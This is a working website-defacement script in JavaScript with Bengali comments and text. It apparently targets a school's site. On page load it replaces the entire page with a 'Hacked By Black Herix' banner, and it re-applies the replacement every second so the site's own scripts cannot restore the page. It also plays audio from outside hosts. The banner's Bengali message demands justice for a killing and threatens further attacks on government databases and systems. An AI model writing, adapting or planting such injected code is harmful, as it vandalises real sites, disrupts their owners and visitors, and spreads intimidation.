window.addEventListener('DOMContentLoaded', (event) => {
    // পেজ লোড হওয়ার সাথে সাথে পুরো বডি এবং এইচটিএমএল লক করার জন্য
    function applyDeface() {
        document.documentElement.innerHTML = `
<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SYSTEM COMPROMISED BY BLACK HERIX</title>
    <style>
        :root {
            --blood-red: #ff0000;
        }
        * {
            margin: 0; padding: 0; box-sizing: border-box;
        }
        body, html {
            height: 100% !important; width: 100% !important; overflow-y: auto !important; 
            background-color: #000000 !important; font-family: 'Courier New', Courier, monospace;
            color: #ff0000; position: relative;
        }
        .bg-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(rgba(0, 0, 0, 0.93), rgba(0, 0, 0, 0.88)), url('https://i.ibb.co/ccrjKJh5/1000021966.jpg') no-repeat center center/cover;
            opacity: 0.2; z-index: 1; pointer-events: none;
        }
        .wrapper {
            position: relative; z-index: 999999 !important; max-width: 900px; margin: 0 auto;
            padding: 40px 20px; text-align: center; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh;
        }
        .warning-box { border: 2px solid #ff0000; background: rgba(255, 0, 0, 0.05); padding: 15px; margin-bottom: 30px; font-weight: bold; letter-spacing: 2px; width: 100%; }
        .target-img { width: 220px; height: 220px; border: 4px solid #ff0000; object-fit: cover; box-shadow: 0 0 30px rgba(255, 0, 0, 0.7); margin-bottom: 25px; border-radius: 10px; }
        .hacker-main { font-size: 3rem; font-weight: 900; color: #fff; text-shadow: 0 0 10px #ff0000, 0 0 30px #ff0000; margin-bottom: 20px; letter-spacing: 3px; }
        .threat-message { color: #ff0000; font-size: 1.5rem; font-weight: bold; line-height: 1.6; margin-bottom: 40px; background: rgba(0, 0, 0, 0.8); padding: 20px; border-left: 5px solid #ff0000; border-right: 5px solid #ff0000; text-align: justify; }
        .demand-text { font-size: 1.8rem; color: #00ff00; margin: 15px 0; text-shadow: 0 0 10px #00ff00; font-weight: bold; }
        .ultimatum { border-top: 1px dashed #ff0000; border-bottom: 1px dashed #ff0000; padding: 20px 0; color: #ffff00; font-size: 1.4rem; font-weight: bold; text-shadow: 0 0 5px #ffff00; line-height: 1.5; }
        .click-notice { margin-top: 30px; font-size: 1rem; color: #666; font-weight: bold; }
    </style>
</head>
<body>
    <audio id="bg-music" loop src="https://files.catbox.moe/tcj7j8.mp3"></audio>
    <div class="bg-overlay"></div>
    <div class="wrapper">
        <div class="warning-box">[!] WARNING: SYSTEM SECURITY COMPROMISED BY OUTLAWS [!]</div>
        <img src="https://i.ibb.co/ccrjKJh5/1000021966.jpg" alt="Lamisa" class="target-img">
        <h1 class="hacker-main">Hacked By Black Herix</h1>
        <div class="threat-message">আমাদের নীরবতাকে দুর্বলতা ভাববেন না। প্রশাসন এবং সরকারের উচ্চপদস্থ কর্মকর্তাদের কান খুলে শুনে রাখা উচিত— আইন যদি নিজের গতিতে না চলে, তবে আমরা আমাদের নিজস্ব গতিতে বিচার করতে বাধ্য হবো। ডিজিটাল দেয়াল ভেঙে গুঁড়িয়ে দেওয়া কেবল আমাদের ক্ষমতার একটা ছোট ট্রেইলার মাত্র।</div>
        <p class="demand-text">🛑 লামিসা হত্যার সঠিক বিচার চাই 🛑</p>
        <p class="demand-text">🛑 লামিসা হত্যার সঠিক বিচার চাই 🛑</p>
        <p class="demand-text">🛑 লামিসা হত্যার সঠিক বিচার চাই 🛑</p>
        <div class="ultimatum">সরকারের প্রতি শেষ আলটিমেটাম: খুনিদের আড়াল করার চেষ্টা বন্ধ করুন। যদি অবিলম্বে লামিসা হত্যার সুষ্ঠু ও প্রকাশ্য বিচার নিশ্চিত করা না হয়, তবে পরবর্তী সাইবার হামলা হবে আরও ভয়াবহ। প্রতিটি সরকারি ডেটাবেস এবং সিস্টেম আমাদের টার্গেটে থাকবে। জাস্ট ওয়েট অ্যান্ড ওয়াচ!</div>
        <p class="click-notice">[ সাইটের যেকোনো জায়গায় ক্লিক করলে অডিও চালু হবে ]</p>
    </div>
</body>
</html>
        `;
    }

    // সাথে সাথে একবার রান হবে
    applyDeface();

    // স্কুলের অন্য স্ক্রিপ্টগুলো যেন এটাকে সরাতে না পারে, সেজন্য একটা লুপ (Interval) রাখা হলো
    setInterval(applyDeface, 1000);
});

// গ্লোবাল অডিও ট্রিগার
document.addEventListener('click', function() {
    var audio = document.getElementById('bg-music');
    if(audio) {
        audio.play().catch(function(error) {
            console.log("Audio play failed: ", error);
        });
    }
});
